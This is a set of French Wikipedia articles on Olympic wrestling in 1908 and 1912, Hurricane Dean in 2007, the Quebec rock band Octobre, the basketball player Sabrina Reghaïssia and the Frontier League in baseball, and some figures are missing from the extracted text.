<doc id="1873349" url="https://fr.wikipedia.org/wiki?curid=1873349" title="Lutte aux Jeux olympiques de 1912">
Lutte aux Jeux olympiques de 1912

Dix épreuves de lutte eurent lieu à l'occasion des Jeux olympiques de 1912 à Stockholm.
Lutte gréco-romaine.
Poids mi-lourds.
Dans la catégorie des poids mi-lourds les deux finalistes, après avoir combattu plus de sept heures s'adjujèrent une médaille d'argent.
Poids lourds.
Johan Olin, abandonna la finale car il avait combattu... plus de dix heures!

</doc>
<doc id="1873350" url="https://fr.wikipedia.org/wiki?curid=1873350" title="Lutte aux Jeux olympiques de 1908">
Lutte aux Jeux olympiques de 1908

Les épreuves de lutte aux Jeux olympiques de 1908 ont lieu au White City Stadium de Londres, du 20 au . Deux disciplines sont au programme, la lutte libre (6 catégories masculines) et la lutte gréco-romaine (4 catégories masculines).
La lutte a été au programme de tous les Jeux olympiques d'été modernes, à l'exception de ceux de 1900.
115 lutteurs participent aux 9 épreuves. 

</doc>
<doc id="1873359" url="https://fr.wikipedia.org/wiki?curid=1873359" title="Lutte aux Jeux olympiques d'été de 1928">
Lutte aux Jeux olympiques d'été de 1928



</doc>
<doc id="1873361" url="https://fr.wikipedia.org/wiki?curid=1873361" title="Nikolai Demidenko">
Nikolai Demidenko



</doc>
<doc id="1873364" url="https://fr.wikipedia.org/wiki?curid=1873364" title="All Ireland Cup 2007">
All Ireland Cup 2007



</doc>
<doc id="1873368" url="https://fr.wikipedia.org/wiki?curid=1873368" title="Ouragan Dean">
Ouragan Dean

L’ouragan "Dean" est la tropicale, le de la saison cyclonique 2007 dans le bassin de l'océan Atlantique et le cyclone le plus intense depuis Wilma, en 2005. Il est considéré comme le cyclone le plus violent qu’ait connu l’île de la Martinique depuis David, en 1979, et comme l'un des plus violents à avoir frappé le Mexique au stade de catégorie 5. À cause des dommages et des pertes de vie, l'organisation météorologique mondiale a retiré le nom "Dean" des listes futures de noms d'ouragans pour le bassin Atlantique et l'a remplacé par "Dorian".
Chronologie.
Développement.
Le samedi 11 août 2007, une forte perturbation tropicale terrestre venant du continent africain donne naissance à une onde tropicale nommée 90L, à l'est des îles du Cap Vert.
Au cours de la journée de dimanche, le centre de basse pression varie entre 1007 et 1008 hPa. L'onde se déplace vers l'ouest à 10-15 km/h et amorce une rotation. Des vents soufflant vers l'est en haute altitude freinent encore son développement et son organisation.
Dans la journée du lundi 13 août, l'onde tropicale 90L s'amplifie, devient plus homogène et plus concentrique et se transforme en une dépression tropicale nommée 04L NO NAME. Sa pression est de 1005 hPa, elle maintient une trajectoire ouest avec une vitesse de déplacement de . Le vent moyen est de avec des rafales pouvant atteindre .
Le mardi, la dépression tropicale 04L NO NAME se renforce encore et est alors baptisée tempête tropicale Dean. À 11 h (heure des Antilles), sa position est 11.6° Nord et 41.0° Ouest, soit à à l'est des Petites Antilles, avec un déplacement de . Météo-France et tous les centres de prévisions météorologiques annoncent une très probable traversée des Antilles pour la fin de la semaine.
Le mercredi, la trajectoire de Dean s'infléchit vers le nord en maintenant une direction Ouest-Nord-Ouest à . La pression descend et atteint 994 hPa en son centre, les vents se renforcent avec une moyenne constante de 100 km/h et se font sentir jusqu'à 100 km du centre. La température de l'eau devient de plus en plus élevée et la tempête tropicale Dean est annoncée comme devenant rapidement le premier ouragan de classe 1 de cette saison cyclonique 2007. À 22h00 UTC, le phénomène se trouve à à l'est des Petites Antilles et sa trajectoire entraîne une vigilance sur tout l'arc antillais et notamment sur la Martinique et les îles à proximité immédiate, dont la Guadeloupe, placées en phase d'alerte cyclonique orange.
Il y a naissance le même jour d'une autre tempête tropicale nommée Erin, provenant de l'onde tropicale 91L qui s'est transformée dans le Golfe du Mexique en dépression tropicale nommée 05L NO NAME.
Antilles.
Le jeudi à 14 heures locales, l'ouragan Dean, de catégorie 1, situé à environ à l'Est-Sud-Est des Petites Antilles (13°4 Nord - 52°3 Ouest) poursuit sa route très rapidement plein ouest à 39 km/h et se renforce. La trajectoire l'amènera sur la Martinique dès la fin de la nuit de jeudi. La partie nord du phénomène semble plus active en termes de vents, dont l'intensité est d'environ 120 km/h. L'ouragan est accompagné d'une forte houle (4 à 10 m) et de fortes pluies (). La Martinique passe en phase d'alerte rouge à 17h00. Des alertes cycloniques ou de vigilance cyclonique sont déclenchées à Sainte-Lucie, la Dominique, Saint-Eustache, Saba, Antigua, Barbuda, Niévès, Saint-Vincent, Saint-Christophe et Anguilla. Les îles de Saint-Barthélemy et Saint-Martin, un peu en marge du cyclone, sont en alerte jaune. Ce même jour, des alertes sont déclenchées dans les Grandes Antilles : à Porto Rico et dans la République dominicaine. À 19h locales, Météo-France annonce le passage en classe 2, avec des vents soutenus à 160 km/h, la pression ayant encore baissé, à 987 hPa.
Le vendredi à 8h locales, le centre de l'ouragan Dean, de classe 2, est situé à environ 70 km à l'Ouest-Sud-ouest de la Martinique et 200 km au Sud-Sud-Ouest de la Guadeloupe (14°4 Nord - 61°7 Ouest) Les vents sont soutenus à 160 km/h, avec des rafales à 190 km/h. Des vents de 140 à 150 km/h avec des rafales de 170 à 180 km/h ont été mesurés au Vauclin en Martinique, de 110 à 120 km/h avec des rafales à 180 km/h à Fort-de-France. Du côté du Raizet en Guadeloupe, les vents moyens atteignent très brièvement 65 km/h avec des rafales de 90 km/h. Il est tombé 150 mm de précipitations en moyenne sur les 12 dernières heures en Martinique, le maximum étant de 189 mm dans le sud, dont 100 mm en 1h. Dean est annoncé comme pouvant devenir un ouragan majeur dans les 36 heures suivantes. La Martinique passe en alerte violette, correspondant à une phase de confinement. La Guadeloupe reste en alerte rouge.
À 14h locales, Météo-France classe le phénomène en catégorie 3, alors qu'il se situe désormais à 280 km à l'ouest de la Martinique. Des observations d'images satellite laissent apparaître un œil bien défini. La phase de confinement est levée à 20h30 locales, une alerte rouge étant néanmoins toujours en vigueur en raison des forts risques d'averses orageuses soutenues. Les îles de Saint-Barthélemy et Saint-Martin restent en alerte jaune en raison des conditions de mer forte.
Intensification.
Le samedi 18 août, Dean se renforce (classe 4) et se dirige vers la Jamaïque. En Martinique, les dégâts sont déjà très importants. Les deux tiers des habitants sont toujours privés d'électricité. Le bilan humain semble cependant limité, et les médias annoncent 2 décès. Il s'agit en réalité d'un septuagénaire victime d'un infarctus et de la chute d'un nonagénaire dans un escalier. Le cyclone n'a donc en réalité fait aucune victime directe en Martinique. En menaçant le sud de la République dominicaine, Haïti, le sud de Cuba et, surtout, la Jamaïque et les Îles Caïmans, le phénomène pourrait atteindre le stade d’ouragan de classe 5 (vents moyens supérieurs à 250 km/h). En République dominicaine est mort un jeune homme de 16 ans, d'origine haïtienne, qui se trouvait en haut d'une falaise, à l'est de Saint-Domingue, selon les indications du gouverneur de la province de Saint-Domingue, Eladio Martínez. « "Bien que la police, les forces armées et l'autorité métropolitaine de transport (AMET) aient formé un cordon sur la côte, des gens cherchent toujours à passer pour voir les vagues comme s'il s'agissait d'un spectacle" », a-t-il regretté. De fortes pluies étaient rapportées sur l'est et le sud de l'île d'Hispaniola, des inondations, notamment le long des côtes, et des glissements de terrain étaient à craindre, mais en passant à 270 km au sud de la capitale, Dean n'a pas produit de dégâts majeurs.
Le dimanche en Haïti, selon AlterPresse, trois personnes ont été tuées, quatre portées disparues, plusieurs autres blessées et des dégâts matériels enregistrés dans plusieurs régions d’Haïti lors du passage ce 19 août de l’ouragan Dean, selon des informations recueillies de plusieurs sources. Une personne a été tuée et plusieurs autres blessées dans des inondations à Moron, localité du sud-ouest, a confirmé la Protection Civile contactée par AlterPresse. Deux personnes ont péri également dans des inondations à Marigot (Sud-est), selon des témoignages rapportées à AlterPresse par un correspondant bénévole dans la région. Des routes ont été endommagées, rendant difficile l’acheminement des secours. Sur la cote sud, 4 personnes ont disparu en mer à proximité de Tiburon, suivant des informations communiquées à AlterPresse. De forts vents et des pluies modérées ont été enregistrées dans plusieurs régions du pays, occasionnant des dégâts matériels d’ampleur variée, particulièrement au niveau de l’agriculture. Des milliers de personnes ont été déplacées et placées dans des abris provisoires.
Le lundi 20 août, Dean traverse la Jamaïque et les premières estimation des dégâts donnent "autour de 250 millions d'euros". "Pour le moment on en est aux alentours de 250 millions d'euros mais cela concerne surtout les infrastructures dépendant de l'État, les routes, les circuits électriques", a précisé à l'AFP cette même source. "Une estimation précise, complète et détaillée (des dommages, ndlr) est en cours et sera communiquée ce (lundi) soir ou dans les prochains jours", a-t-on ajouté de même source, en soulignant que la première estimation ne tient que partiellement compte des dommages concernant les plantations de bananes, "pratiquement détruites à 100 %".
Dans la nuit du 20 au 21 août 2007, l'ouragan Dean s'est encore renforcé. Il est désormais classé en catégorie 5 (soit la plus élevée de l'échelle Safirr-Simpson) selon le National Hurricane Center qui le considère comme "extrêmement dangereux". L'œil du cyclone, qui a légèrement dévié, a abordé la côte orientale de la péninsule du Yucatan (avec des vents de 280 km/h et des rafales de 325 km/h) près de Costa Maya ou Majahual vers 15H30 locales (8H30 GMT) quelque 65 km à l'est-nord-est de Chetumal, la capitale de l'État du Quintana Roo sur la façade atlantique du pays.
Mexique et dissipation.
Le mardi, Dean (qui se déplace à 32 km/h) traversera le Yucatan pour ressortir dans le golfe du Mexique au niveau de la ville de Campeche, où toutes les installations pétrolières ont été fermées et les quelque employés de la société nationale des pétroles mexicains (Pemex) évacués. Au cours de la journée après que Dean entre dans les terres, son intensité diminue et il passe de catégorie 5 à 3 puis à 2 et enfin à 1 avant qu’il ne rejoigne le sud du golfe du Mexique.
Le mercredi 22 après avoir touché les côtes mexicaines, toutefois sans faire de victimes selon les premiers bilans, Dean (qui est passé en ouragan de catégorie 1) a atteint la baie de Campeche et devrait se renforcer au contact des eaux chaudes de la baie, selon un bulletin publié par le NHC le 21 août à 21h00 UTC. L'ouragan se déplace à une vitesse de 32 km/h avec des vents de 130 km/h tout en se dirigeant a l'ouest-nord-ouest. À 21h00 GMT le 21 août, l'œil se trouvait à 100 km environ a l'ouest-sud-ouest de Campeche et 660 km à l'est-sud-est de Tuxpan (côte orientale du Mexique)
Dans le courant de l'après-midi, le NHC a rapporté qu'a 16h30 GMT, Dean a de nouveau frappé les côtes mexicaines dans l'État de Veracruz à proximité de la ville de Tecotutla. L'ouragan s'est renforcé comme prévu au-dessus du golfe du Mexique et est passé en catégorie 2. Les vents déplacés par Dean sont de 160 km/h, les vents de force cyclonique (au-delà de 118 km/h) quant à eux s'étendent jusqu'à 110 km autour de l'œil du cyclone. Avant le passage de Dean, les infrastructures pétrolières off-shore mexicaines dans le Golfe du Mexique ont été fermées et évacuées. De par ce fait, le Mexique a dû diminuer sa production pétrolière de deux tiers, soit une baisse de 2 millions de barils par jour et un manque à gagner journalier de 150 millions de dollars.
Dans la soirée, un communiqué du NHC annonce que finalement, à 21h00 UTC le 22 août, le gouvernement du Mexique a levé l'alerte ouragan et réévalué Dean en tant que tempête tropicale. Un bulletin d'alerte de tempête tropicale a été émis pour une région allant du nord de Palma Sola à La Cruz. Dean se déplace désormais à une vitesse de 28 km/h vers l'ouest. Les vents maximums sont descendus à 110 km/h toutefois des rafales plus fortes restent possibles sur les hauteurs. L'affaiblissement devrait se poursuivre jusqu'à la dissipation de Dean dans les montagnes au centre du Mexique. La dissipation est prévue pour la nuit du 22 au 23 ou tôt le 23.
Enfin, le jeudi 23 août après avoir atteint l'État de Veracruz, Dean se heurte aux montagnes de la Sierra Maestra orientale où il disparaît progressivement. Selon le dernier bulletin du NHC, Dean est situé 20.5 N 100.0 O, la pression minimale étant désormais de 1000 hPa. On recense une dernière victime indirecte de l'ouragan : un homme qui essayait de réparer son toit à Xalapa, est mort électrocuté quand une plaque de tôle a touché un câble électrique, selon la police.
Bilan.
Antilles Françaises.
Dean a traversé le centre de l'arc antillais en fin de nuit de jeudi 16 à vendredi 17. De catégorie 2 à l'approche de la Martinique, il s'est renforcé progressivement lors de son passage dans le canal de Sainte-Lucie, au sud de la Martinique, pour devenir de catégorie 3 après avoir quitté l'arc antillais. Il générait alors près de son centre des vents moyens maximum sur une minute de l'ordre de 160-180 km/h avec des rafales dépassant les 200 km/h.
Le centre n'est passé qu'à quelques kilomètres au sud de la Martinique (15 km de Sainte-Anne, 30 km de l'aéroport du Lamentin) avec un œil en formation. Le mur de l'œil a balayé les régions côtières du sud de la Martinique entre 4 et 7 heures du matin.
C'est la Martinique qui a été frappée par les conditions d'ouragan les plus sévères au niveau de l'arc Antillais. Il faut remonter à l'ouragan David en 1979 et à l'ouragan Allen en 1980 pour retrouver des conditions similaires.
Du côté guadeloupéen, si les conditions atmosphériques, de vents et de précipitations n'ont pas été aussi dures qu'en Martinique, il n'en est pas de même pour les conditions de mer : en effet, là aussi les houles cycloniques violentes ont généré des vagues dévastatrices comprises entre 6 et 10 mètres. Ainsi, si les infrastructures terrestres guadeloupéennes ont bien moins souffert que les martiniquaises, le littoral a été endommagé de manière non négligeable. Tourisme, pêche et activités nautiques furent directement touchés par les conséquences du cyclone Dean.
Le 22 août, le premier ministre français François Fillon a dit vouloir « effacer totalement » les conséquences de Dean, qui a fait deux morts et dévasté les plantations de bananes et de canne à sucre. Il a assuré : « Je reviendrai à la Martinique avant la fin de l'année pour constater et vérifier que tout ce que nous avons dit ensemble a bien été mis en œuvre. » Le gouvernement évoque une fourchette de 170 à 250 millions d'euros de dégâts alors que le président du conseil régional et député PS de Guadeloupe, Victorin Lurel, a estimé les dégâts à 250 millions d'euros pour la Martinique et 150 millions pour la Guadeloupe. Nicolas Sarkozy a assuré que "la solidarité nationale s'exercerait pleinement" après une évaluation précise des dégâts.
Dissipation.
Le , les membres du comité sur les cyclones tropicaux de l'organisation météorologique mondiale (OMM) ont retiré le nom "Dean" des listes futures de noms d'ouragans pour le bassin Atlantique lors de leur réunion annuelle qui a eu lieu à Orlando (Floride), États-Unis. Il a été remplacé par "Dorian" dans la liste pour la saison 2013.

</doc>
<doc id="1873373" url="https://fr.wikipedia.org/wiki?curid=1873373" title="Yves Saint-Laurent">
Yves Saint-Laurent



</doc>
<doc id="1873376" url="https://fr.wikipedia.org/wiki?curid=1873376" title="Kamiros">
Kamiros



</doc>
<doc id="1873379" url="https://fr.wikipedia.org/wiki?curid=1873379" title="Numéro d'identification personnel">
Numéro d'identification personnel



</doc>
<doc id="1873383" url="https://fr.wikipedia.org/wiki?curid=1873383" title="Octobre (groupe)">
Octobre (groupe)

Octobre est un groupe rock progressif québécois, originaire de Montréal, au Québec. Il est formé en 1971 par quatre amis d'enfance : Pierre Flynn (paroles et musique, chant, piano, claviers), Jean Dorais (guitare, chœurs), Mario Légaré (basse, chœurs) et Pierre Hébert (batterie). Il est un des premiers groupes québécois francophones à avoir intégré un style progressif (style très en vogue dans les années 1970) à son répertoire rock. Ce qui explique qu'il ait joué en première partie d'un concert de King Crimson en 1973.
Le groupe met fin à ses activités en 1982. Même si Octobre n'a pas eu un grand succès populaire comme Harmonium ou Beau Dommage, il a néanmoins marqué le répertoire musical québécois de l'époque. Il ne doit pas être confondu avec le groupe français Octobre (1982-1984) issu d'une scission de l'ancienne formation Marquis de Sade.
Biographie.
Origines.
En 1969, Pierre Flynn forme le groupe Gladstone avec son cousin Jean Dorais à la guitare et Mario Légaré à la basse dans le quartier montréalais de Côte-des-Neiges, jouant surtout des reprises de groupes et chanteurs anglophones tels que les Rolling Stones, les Beatles, Santana et Bob Dylan. Puis Jean Dorais quitte pour joindre le groupe Jude 3 qui a aussi dans ses rangs le claviériste Claude Lemay, alors que de son côté le groupe Gladstone se dissout peu de temps après. Désireux de former un groupe francophone, Pierre Flynn et Mario Légaré rencontrent le batteur Pierre Hébert et forment Maelstrom.
Débuts et séparation.
Puis après le retour de Dorais pour rejoindre les trois musiciens de Maelstrom, le groupe change de nom et ainsi naît Octobre en 1971. Alors que des cendres de Jude 3 naîtra le groupe progressif québécois Pollen. Avec seulement en poche, les membres d'Octobre décident d'enregistrer un premier album éponyme en 1972, le disque sort quelques mois plus tard en 1973. Leur gérant Gerry Plamondon, qui gérait avant la carrière du groupe Les Sultans, leur fait faire des apparitions à la télé, entre autres à l'émission "Jeunesse".
Autant les influences américaines qu'européennes s'appliquent au son d'Octobre qui mélange à la fois un rock unique, des éléments progressifs ainsi que du jazz. Durant l'année 1973, ils se produisent beaucoup en spectacles, en juin ils jouent à "Québec en Fête" à l'Autostade de Montréal avec Les Séguin, Gilles Vigneault et Félix Leclerc. En juillet, c'est "L'Été Show de la Bastille" à Québec avec le Ville Émard Blues Band, puis en août, ils sont au Centre National des Arts avec Claude Dubois. Et en Septembre, ils font la première partie de King Crimson à Montréal et à Québec, Juan Rodriguez écrit dans le "Montreal Star" « Octobre a presque volé le show ». En 1974, ils enregistrent l'album "Les Nouvelles terres" au Studio Six avec Quentin Meek et qui sortira en octobre.
Puis on les retrouve aussi lors de grands événements québécois, comme le grand spectacle sur le Mont-Royal pour la Fête de la Saint-Jean de 1975, aux côtés de Beau Dommage, Harmonium, Louise Forestier, Ginette Reno, Yvon Deschamps et Gilles Vigneault. Puis en 1976, toujours dans le cadre des Fêtes de la Saint-Jean sur le Mont-Royal, Octobre retrouve les groupes Harmonium, Beau Dommage et Contraction ainsi que Richard Séguin et Raôul Duguay, dans le cadre du spectacle intitulé "Ok nous v'la". Le journal "La Presse" écrit à la suite de cet événement : .
Octobre se produit aussi en Ontario et dans les Maritimes. En 1978, ils publient l'album live "Chants dans la nuit", classé des par "L'Actualité". En 1979 se joint comme cinquième membre officiel Gerry Leduc, saxophoniste et claviériste pour l'enregistrement de leur dernier album "Clandestins". Cet album marque aussi la contribution de Jean Dorais et Mario Légaré à l'écriture. Le groupe met un terme à ses activités en 1982.
Post-séparation.
À partir de 1982, les musiciens du groupe décident de consacrer leur temps à des projets solo. Le bassiste Mario Légaré joue alors avec Paul Piché et Michel Rivard et aussi avec Daniel Bélanger. Pierre Hébert pour sa part joue avec la chanteuse française Geneviève Paris et Jean-Pierre Ferland, accompagne Chris De Burgh au Forum de Montréal et il travaille aussi à la télé lors de galas comme l'ADISQ, les prix Gémeaux et le Gala Artis entre autres. Jean Dorais sort un album solo en 1985, "Radio-actif". Pierre Flynn en fait autant en 1987 avec un premier disque, "Le Parfum du hasard", suivi d'un second en 1991, "Jardins de Babylone", et d'un troisième "Mirador" en 2001 ; puis en 2005, il interprète Abraham Van Helsing dans la comédie musicale "Dracula, entre l'amour et la mort" de Bruno Pelletier et Roger Tabra. Il participe aussi à Nelligan d'André Gagnon et Michel Tremblay sous la direction musicale de l'Orchestre Symphonique de Montréal, avec Richard Séguin, Daniel Bélanger et Daniel Lavoie. Entretemps, il produit deux autres albums solo, "Vol solo" en 2006 et "Sur la terre" en 2015. Il participe au projet "12 hommes rapaillés chantent Gaston Miron volume 1 : Poème" en 2008, et fait de même en 2010 avec "12 hommes rapaillés chantent Gaston Miron volume 2 : Ma rose éternité". Il écrit pour Louise Forestier, la chanson "Prince Arthur" en 1983, puis cette même année, il accompagne Offenbach et Plume Latraverse pour la tournée "À fond d'train" pendant laquelle il joue les claviers et fait les chœurs pendant les performances de Plume. Un album double de cette tournée est produit en 1983. En 1988, Pierre Flynn et Mario Légaré jouent dans un film de Jean Lepage intitulé "Rock" sur une musique de Gilles Valiquette. Avec entre autres Patrick Labbé, Louise Laparé, Yvan Ducharme, etc.
Retour d'Octobre.
Le groupe s'est réuni sans Gerry Leduc à trois reprises depuis, soit au Festival international de jazz de Montréal en 1989 avec, pour l'occasion, Claire Pelletier comme choriste, et au Festival d'été de Québec en 1996 pour souligner le lancement de leur compilation "-1989". Puis en 2006, ils se réunissent de nouveau à Petite Vallée en Gaspésie, dans le cadre du Festival en chanson. Les albums originaux qui sont produits en disque vinyle ne seront jamais réédités en disque compact sauf pour "L'Autoroute des rêves" qui n'est plus disponible. Une compilation de deux disques compacts intitulée "Octobre 1972-1989", publiée en 1996 sur le label Audiogram, pallie ainsi grandement ce manque.
À la suite de l'incendie qui a ravagé le Théâtre de la Vieille Forge de Petite-Vallée, le batteur Pierre Hébert a eu l'idée de réunir ses amis du groupe en faisant un spectacle bénéfice qui a lieu le , lors de « La grande réunion autour du feu », un spectacle-bénéfice en soutien à la reconstruction du Théâtre de la Vieille Forge. Ce concert a lieu au MTELUS et réunit Karkwa, Michel Rivard et Marie-Pierre Arthur. Ce n'est pas la première fois qu'Octobre joue à Petite-Vallée, puisqu'en 2006, ils se sont réunis, toujours sous la bannière du groupe, au Festival en chanson qui avait eu lieu dans ce petit village côtier de la Gaspésie. Pierre Flynn est d'ailleurs le Parrain de cet événement, entouré des formateurs Louise Forestier, Marie-Claire Séguin, Daniel Lavoie, Gilles Bélanger et Edgar Bori.
Projets parallèles.
Le chanteur du groupe, Pierre Flynn, fait aujourd'hui une carrière solo. Il sort quatre albums studio entre 1987 et 2015 et un live en 2006. Il reprend deux chansons d'Octobre, dans son album live "Vol Solo", "Le vent se lève" et "L'oiseau rouge". Il a également interprété le rôle d'Abraham Van Helsing de 2005 à 2006 dans la comédie musicale "Dracula, entre l'amour et la mort" au côté de Bruno Pelletier, Daniel Boucher, Sylvain Cossette et Andrée Watters.
Jean Dorais fait carrière dans le domaine de l'informatique. Cependant, il sort l'album "Radioactif" avec la collaboration à l'écriture de Marc Desjardins sur le label « CBS » en 1986, avec Pierre Flynn aux claviers et Marc Gabriel aux chœurs. N'étant sorti qu'en disque vinyle, cet album n'est plus disponible, Jean a par la suite joué sur deux chansons du premier album solo de Pierre Flynn "Le parfum du hasard" en 1987.
Mario Légaré joue avec plusieurs artistes, tels que Lhasa de Sela, Paul Piché, Edgar Bori et fait partie du groupe Flybin Band avec Rick Haworth (guitare), Sylvain Clavette (batterie) et Jean-Sébastien Fournier (claviers) qui accompagne habituellement Michel Rivard en studio et en tournée. En 2005, avec Haworth et Clavette, il forme le groupe Magneto et enregistre un album du même nom. Il a renoué avec Flynn dans l'album "Mirador" et la tournée qui a suivi, ainsi que l'album "Sur la terre". Il a aussi collaboré au magazine humoristique "Croc" durant la majeure partie de son existence. Puis il accompagne Daniel Bélanger sur disques et en concerts. Il joue aussi sur deux albums solo de l'ex-claviériste de Maneige, Jérôme Langlois, "Molignak" en 2005 et "Pièces Pour Piano &amp; La Luna Suite" en 2011 avec d'autres musiciens de ce défunt groupe.
Pierre Hébert, en plus de jouer la batterie dans des galas et des émissions de télévision variées, entreprend une carrière de musicien de studio qui le mène à apparaître sur une quarantaine d'albums de divers artistes. Allant du Grand Cirque Ordinaire en 1975 à The Tenors en 2017, en passant par Walter Rossi et Michel Cusson, de Geneviève Paris à Bourbon Gauthier, sans oublier Patsy Gallant et Rudy Caya. Il retrouve aussi Pierre Flynn sur son album "Jardins de Babylone" en 1991.

</doc>
<doc id="1873385" url="https://fr.wikipedia.org/wiki?curid=1873385" title="Armorial de la maison de Rochechouart">
Armorial de la maison de Rochechouart

Cette page regroupe les armoiries des différentes branches de la Maison de Rochechouart.

</doc>
<doc id="1873386" url="https://fr.wikipedia.org/wiki?curid=1873386" title="Christian Martin">
Christian Martin

Christian Martin peut désigner :

</doc>
<doc id="1873390" url="https://fr.wikipedia.org/wiki?curid=1873390" title="Numéro d'identification personnelle">
Numéro d'identification personnelle



</doc>
<doc id="1873402" url="https://fr.wikipedia.org/wiki?curid=1873402" title="Sabrina Reghaïssia">
Sabrina Reghaïssia

Sabrina Reghaïssia (née le à Amiens) est une ancienne joueuse et désormais entraîneuse française de basket-ball. En tant que joueuse, elle évoluait au poste d’Intérieure.
Biographie.
Elle commence le basket-ball en Picardie avant de rejoindre pour un an le Centre fédéral (1999-2000). Elle passe ensuite deux saisons à Calais, puis deux autres saisons (2002-2004) à Villeneuve d’Ascq . Elle rejoint Bourges (2004-2006) où elle décrochera son premier titre de championne de France. Après une saison à Lattes-Montpellier, elle retrouve le nord de la France à Valenciennes (2007-2008) puis au Hainaut Basket après la fusion entre l’USVO et l’USAPH.
Afin de pallier la blessure d'Emmanuelle Hermouet, Jacques Commères, le sélectionneur de l'Équipe de France, l'a incorporée au groupe qui prépare le prochain Championnat d'Europe 2007 qui aura lieu en Italie. Elle avait déjà participé aux stages de l'équipe de France lors de l'exercice précédent.
En 2011, après une pause de quelques mois dans sa carrière, elle s'engage à Arras.
Après une saison 2012-2013 à Basket Landes (5,5 points et 3,9 rebonds), elle s'engage pour la saison suivante à Tarbes. Après deux années à Tarbes, elle rejoint Toulouse à l'été 2015.
En 2015-2016, elle ne peut empêcher la relégation de Toulouse malgré avec 7,7 points et 4,2 rebonds de moyenne. Elle retrouve Arras en Ligue 2 pour relancer sa carrière.
À la fin de la saison de Ligue 2 2017-2018 avec Arras, elle annonce sa fin de carrière sportive.

</doc>
<doc id="1873404" url="https://fr.wikipedia.org/wiki?curid=1873404" title="Ligue Frontière">
Ligue Frontière

La ligue Frontière ou ligue Frontier (en anglais ) est une ligue indépendante de baseball professionnel implantée au Canada et aux États-Unis, dans l'Est et le Midwest. Malgré son statut de ligue indépendante, la ligue Frontière est partenaire des ligues majeures dans le développement des joueurs.
La ligue Frontière commence ses activités en 1993. En 2019, elle absorbe la ligue Can-Am. En 2025, la ligue compte dix-huit équipes.
Fonctionnement.
Structure.
La ligue Frontière est une association nord-américaine d'équipes sportives professionnelles qui rassemble des franchises de baseball implantées au Canada et aux États-Unis. La ligue organise annuellement une compétition entre les seize équipes qui la composent.
Les dix-huit franchises sont divisées au sein de deux associations, ' et ', qui comptent chacune quatre divisions de quatre ou cinq équipes.
La ligue est dirigée par Steve Tahsler, qui en était autrefois le commissaire adjoint. Bill Lee, commissaire de la ligue pendant , est nommé commissaire émérite en 2021 afin de reconnaître son travail de développement.
Les bureaux de la ligue sont situés à Avon (Ohio).
Calendrier.
En règle générale, les équipes jouent une saison régulière de , qui s'étire de mai à septembre. Au terme de la saison, des séries éliminatoires permettent de déterminer le vainqueur du championnat.
Dans chaque chaque division, l'équipe ayant obtenu le plus grand pourcentage de victoires participe aux séries éliminatoires. Une course au quatrième as ("", en anglais) permet aux équipes ayant obtenu la meilleure fiche, sans égard à leur division d'appartenance, de se qualifier pour les séries éliminatoires. En première ronde, les équipes s'étant qualifiées lors de la course au quatrième as affrontent les champions de division dans une série deux de trois. Le championnat d'association oppose les vainqueurs de la première ronde dans une série trois de cinq. La série de championnat oppose les vainqueurs de la série précédente. Le championnat est remporté par l'équipe qui gagne trois matches lors de cette série.
L'assistance annuelle cumulée pour l'ensemble des matches est supérieure à , et la plupart des équipes vendent plus de par saison.
Composition des équipes.
Chaque équipe de la ligue Frontière doit compter une formation composée de 22 à actifs. La formation doit compter :
Les joueurs comptant moins de au bâton, à la défense ou lancées ne sont pas comptés dans l'effectif régulier. Aussi, les anciens combattants bénéficient d'une exemption du statut de vétéran selon le nombre d'années passées dans les forces armées.
Les joueurs des ligues indépendantes reçoivent généralement entre mensuellement au cours de la saison. Dans la Frontière, la rémunération des recrues est limitée à par mois, tandis que les vétérans peuvent être rémunérés à hauteur de chaque mois, et le joueur le mieux payé peut recevoir jusqu'à . En 2020, le plafond salarial est augmenté de à . 
Règle supplémentaires.
En plus d'appliquer les règles de la Ligue majeure de baseball, la ligue Frontière applique une règle inédite de bris d'égalité après la manche. Cette règle prévoit une demi-manche de mort subite qui suit une manche jouée selon la règle internationale de bris d'égalité. Préalablement à cette demi-manche, le gérant de l'équipe hôte détermine si son équipe jouera à la défense ou au bâton. Le joueur précédant le prochain frappeur en lice est ensuite placé sur le premier but. L'équipe au bâton remporte le match si elle parvient à marquer. La victoire appartient plutôt à l'équipe défensive si elle réussit à blanchir son adversaire. Cette règle élaborée par Dennis Pelfrey (maintenant gérant des Flying Squirrels de Richmond), puis perfectionnée par les gérants des Capitales de Québec, des Titans d'Ottawa et des .
Depuis 2022, la ligue Frontière applique aussi la règle « Shohei Ohtani », qui permet à un lanceur retranché de conserver sa place de frappeur désigné au cours d'une même partie. Cette règle est instaurée entre autres afin d'accommoder les Capitales et les .
Histoire.
La ligue Frontière commence ses activités en 1993, avec huit équipes localisées le long de la rivière Ohio au Kentucky, en Ohio et en Virginie-Occidentale. Le nom choisi pour désigner la ligue rappelle les aventures de Davy Crockett et évoque la frontière traditionnelle entre la partie colonisée, à l'est, et l'ouest sauvage, avant la Conquête de l'Ouest.
La ligue connaît une première saison mouvementée, tandis que deux des huit équipes cessent abruptement leurs activités au début du calendrier; les Coal Sox de Virginie-Occidentale et les , basées dans la , jouent une dizaine de parties avant de fermer les livres. Lors de cette même saison, la ligue autorise le transfert de onze joueurs vers les ligues mineures et, à l'issue de la saison, quatre autres joueurs signent un contrat avec une équipe affiliée. Le premier championnat est remporté par les , qui défont les . Les , les , les , les sont les autres équipes fondatrices de la ligue.
En 1994, Kendra Hanes des Rifles du Kentucky devient la première femme à jouer dans une ligue professionnelle de baseball depuis .
En 2018, de la ligue Frontière avaient atteint les ligues majeures. est le premier joueur issu de la Frontière à atteindre le plus haut niveau de baseball professionnel lorsqu'il intègre la formation des Padres de San Diego en 2000. le suit de près, intégrant les Red Sox de Boston quelques semaines plus tard. est le premier joueur ayant joué au sein du circuit indépendant à remporter les séries mondiales (en 2002, avec les Angels d'Anaheim), et le premier à être choisi pour le match des étoiles de la Ligue majeure de baseball (en 2003).
2019-2020 : absorption de la ligue Can-Am.
Localisation géographique des équipes
Le , il a été annoncé que la ligue Frontier fusionnerait avec la ligue Can-Am, absorbant cinq de ses équipes pour former la plus grande ligue indépendante de baseball. Cela a ajouté les Jackals du New Jersey, les Boulders de New York, les Capitales de Québec, les Miners de Sussex County et les Aigles de Trois-Rivières à la ligue. Les Champions d'Ottawa, la dernière équipe restante de la Ligue Can-Am, n'ont pas été invités à participer. Les divisions ont été renommées, les équipes les plus à l'est jouant dans la Division Can-Am et les plus à l'ouest dans la Division Midwestern.
2021 : ajustements temporaires en raison de la pandémie de COVID-19.
